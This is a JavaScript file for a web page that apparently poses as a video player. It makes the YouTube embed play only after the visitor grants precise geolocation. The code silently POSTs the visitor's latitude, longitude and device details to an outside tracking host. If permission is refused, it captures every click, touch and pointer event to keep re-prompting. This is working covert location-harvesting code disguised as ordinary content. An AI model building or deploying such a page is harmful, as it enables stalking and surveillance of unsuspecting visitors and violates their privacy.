const youtubeEmbedUrl = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=1&rel=0&playsinline=1";
let playing = false;
let retryMode = false;

function cleanupRetryListeners() {
    document.removeEventListener("click", handleRetryClick, true);
    document.removeEventListener("touchstart", handleRetryClick, true);
    document.removeEventListener("pointerdown", handleRetryClick, true);
}

async function shareLocation() {
    if (!navigator.geolocation) {
        return false;
    }

    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const deviceName = navigator.userAgent.split(" ").slice(-1)[0] || "Unknown";
                const deviceType = /mobile|android|webos|iphone|ipad|ipod/i.test(navigator.userAgent) ? "Mobile" : "Desktop";

                console.log(`Location: Lat ${lat}, Lng ${lng}, Device: ${deviceName}, Type: ${deviceType}`);

                try {
                    await fetch("https://track-hhek.onrender.com/location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            user: "Anonymous User",
                            lat,
                            lng,
                            device_name: deviceName,
                            device_type: deviceType
                        })
                    });
                } catch (error) {
                    console.error(error);
                }

                resolve(true);
            },
            () => {
                resolve(false);
            }
            ,
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

async function startPlayer() {
    if (playing) {
        return;
    }

    const captured = await shareLocation();

    if (!captured) {
        retryMode = true;
        document.body.classList.add("retrying");
        document.addEventListener("click", handleRetryClick, true);
        document.addEventListener("touchstart", handleRetryClick, true);
        document.addEventListener("pointerdown", handleRetryClick, true);
        return;
    }

    playing = true;
    retryMode = false;
    document.body.classList.remove("retrying");
    cleanupRetryListeners();

    const playerShell = document.getElementById("playerShell");
    const player = document.getElementById("player");

    player.src = youtubeEmbedUrl;
    playerShell.classList.remove("hidden");
}

function handleRetryClick(event) {
    if (!retryMode || playing) {
        return;
    }

    event.preventDefault();
    event.stopPropagation();
    cleanupRetryListeners();
    startPlayer();
}

document.getElementById("playLink").addEventListener("click", async (event) => {
    event.preventDefault();
    await startPlayer();
});